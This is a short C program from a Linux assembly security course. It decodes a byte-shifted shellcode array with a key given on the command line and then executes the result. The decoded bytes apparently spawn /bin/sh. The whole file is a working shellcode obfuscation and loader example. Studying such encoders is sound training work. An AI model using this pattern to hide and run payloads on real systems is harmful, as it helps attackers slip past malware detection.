// Linux/x86 Custom decrypter
// Author SLAE - 926 for SecurityTube Linux Assembly Expert course

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char shellcode[] =\
"\x33\xc2\x52\x33\xdd\x6a\x70\x31\x75\x6a\x6a\x31\x31\x64\x6b\x8b\xe5\x52\x8b\xe3\x55\x8b\xe4\xb2\x0d\xcf\x82";

int main (int argc, char *argv[]){

unsigned char decrypted[strlen(shellcode)];

	if (argc > 2) {
		printf("Too many arguments\n");
		return 1;
	}
	
	if (argc < 2 ) {
		printf("Usage: ./decrypter <key>\n");
		return 1;
	}	

    char *ch = argv[1];
    char key = atoi(ch);

	int i;
	for(i = 0; i <=strlen(shellcode)-1; i++)
		decrypted[i] = shellcode[i] - key;
	
	printf("\nCustom crypter decrypted string:\n");
	for(i = 0; i <=strlen(shellcode)-1; i++)
		printf("\\x%02x", decrypted[i]);
	
	int (*ret)(void) = (int(*)(void))decrypted;
	ret();
}
